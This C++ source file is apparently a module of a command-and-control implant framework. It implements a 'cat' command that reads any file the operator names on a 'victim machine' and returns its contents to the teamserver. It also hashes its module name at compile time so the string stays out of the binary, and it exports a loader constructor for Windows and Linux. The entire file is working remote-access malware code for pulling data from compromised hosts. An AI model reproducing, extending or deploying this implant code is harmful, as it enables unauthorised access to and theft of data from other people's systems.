#include "Cat.hpp"

#include "Common.hpp"

#include <cstring>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "cat";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) Cat* CatConstructor() 
{
    return new Cat();
}

#else

__attribute__((visibility("default"))) Cat* CatConstructor() 
{
    return new Cat();
}

#endif

Cat::Cat()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Cat::~Cat()
{
}

std::string Cat::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Cat Module:\n";
    info += "Read and display the contents of a file from the victim machine.\n";
    info += "Useful for quickly inspecting text files or verifying file contents.\n";
    info += "\nExample:\n";
    info += "- cat c:\\temp\\toto.txt\n";
#endif
    return info;
}

int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) 
    string inputFile;
    for (std::size_t idx = 1; idx < splitedCmd.size(); ++idx)
    {
        if (!inputFile.empty())
            inputFile += " ";
        inputFile += splitedCmd[idx];
    }
    if (inputFile.empty())
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_inputfile(inputFile);
#endif
    return 0;
}


namespace
{
    constexpr int ERROR_OPEN_FILE = 1;
}

int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.inputfile());
    c2RetMessage.set_inputfile(c2Message.inputfile());

    std::string inputFile = c2Message.inputfile();
    try
    {
        std::ifstream input(inputFile, std::ios::binary);
        if (input)
        {
            std::string buffer(std::istreambuf_iterator<char>(input), {});
            c2RetMessage.set_returnvalue(buffer);
            c2RetMessage.set_errorCode(0);
            return 0;
        }
    }
    catch (const std::ios_base::failure&)
    {
        // Report a file read failure through the response, like a failed open.
    }

    c2RetMessage.set_returnvalue({});
    c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
    return 0;
}


int Cat::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (c2RetMessage.errorCode() == ERROR_OPEN_FILE)
        errorMsg = "Failed: Couldn't open file";
#endif
    return 0;
}
